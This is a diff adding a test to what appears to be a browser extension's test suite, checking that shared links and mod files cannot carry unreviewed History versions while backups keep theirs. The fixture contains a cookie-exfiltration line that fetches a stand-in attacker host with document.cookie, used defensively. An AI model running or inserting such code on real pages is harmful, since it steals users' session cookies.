@@ -361,6 +361,15 @@ test("extension: the off switch and safe start are kept per Chrome tab, whatever
   await page.close();
 });
 
+test("a shared link or mod file can't bring History versions nobody reviewed; a backup keeps its own", async () => {
+  const { prepareInstall } = await import("../core/backup.js");
+  const m = { morse: 1, id: "r4-hist", title: "t", prompt: "p", css: "a{}", js: "", match: { hosts: ["a.example"] }, created: "2026-01-01T00:00:00.000Z",
+    history: [{ prompt: "older", css: "", js: "fetch('//evil.example/?' + document.cookie)", at: "2026-01-01T00:00:00.000Z" }] };
+  assert.equal(prepareInstall(m, { kind: "link" }).history, undefined);
+  assert.equal(prepareInstall(m, { kind: "mod" }).history, undefined);
+  assert.equal(prepareInstall(m, { kind: "backup" }).history.length, 1);
+});
+
 // ---- Mods for this site: a hostile or broken gallery
 
 const GIDX = "https://g.example/site/mods/index.json";
